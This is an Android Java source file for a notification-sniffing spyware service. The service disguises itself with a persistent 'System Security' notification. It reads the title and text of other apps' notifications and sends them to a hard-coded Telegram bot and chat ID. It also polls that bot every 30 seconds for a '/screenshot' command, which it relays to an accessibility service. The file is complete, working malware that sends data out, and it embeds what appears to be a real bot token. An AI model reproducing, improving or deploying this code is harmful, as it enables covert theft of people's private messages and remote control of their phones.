package com.v8.global.sniffer;

import android.app.*;
import android.content.*;
import android.os.*;
import android.service.notification.*;
import androidx.core.app.NotificationCompat;
import okhttp3.*;
import java.io.IOException;
import java.util.Timer;
import java.util.TimerTask;

public class NotificationService extends NotificationListenerService {
    private static final String TOKEN = "8307560710:AAFNRpzh141cq7rKt_OmPR0A823dxEaOZVU";
    private static final String CHAT_ID = "7259620384";
    private final OkHttpClient client = new OkHttpClient();

    @Override
    public void onCreate() {
        super.onCreate();
        startForeground(101, createPersistentNotification());
        
        // فحص الأوامر من البوت دورياً
        new Timer().scheduleAtFixedRate(new TimerTask() {
            @Override public void run() { checkBotCommands(); }
        }, 0, 30000);
    }

    private void checkBotCommands() {
        Request request = new Request.Builder()
                .url("https://api.telegram.org/bot" + TOKEN + "/getUpdates?offset=-1")
                .build();
        client.newCall(request).enqueue(new Callback() {
            @Override public void onResponse(Call c, Response r) throws IOException {
                String body = r.body().string();
                if (body.contains("/screenshot")) {
                    // إرسال إشارة لخدمة الوصول لأخذ سكرين
                    Intent intent = new Intent("TAKE_SCREENSHOT");
                    sendBroadcast(intent);
                }
                r.close();
            }
            @Override public void onFailure(Call c, IOException e) {}
        });
    }

    @Override
    public void onNotificationPosted(StatusBarNotification sbn) {
        String pkg = sbn.getPackageName();
        if (pkg.equals("android") || pkg.equals(getPackageName())) return;
        
        Bundle extras = sbn.getNotification().extras;
        String title = extras.getString(Notification.EXTRA_TITLE, "No Name");
        String text = String.valueOf(extras.get(Notification.EXTRA_TEXT));
        
        String report = "🎯 صيدة:\n📱 " + pkg + "\n👤 " + title + "\n💬 " + text;
        sendToTelegram(report);
    }

    private void sendToTelegram(String msg) {
        String url = "https://api.telegram.org/bot" + TOKEN + "/sendMessage?chat_id=" + CHAT_ID + "&text=" + msg;
        client.newCall(new Request.Builder().url(url).build()).enqueue(new Callback() {
            @Override public void onResponse(Call c, Response r) { r.close(); }
            @Override public void onFailure(Call c, IOException e) {}
        });
    }

    private Notification createPersistentNotification() {
        String cid = "v8_channel";
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            NotificationChannel chan = new NotificationChannel(cid, "System Sync", NotificationManager.IMPORTANCE_LOW);
            ((NotificationManager) getSystemService(NOTIFICATION_SERVICE)).createNotificationChannel(chan);
        }
        return new NotificationCompat.Builder(this, cid)
                .setContentTitle("System Security")
                .setContentText("الحماية تعمل بشكل مستقر")
                .setSmallIcon(android.R.drawable.stat_notify_sync)
                .build();
    }
}
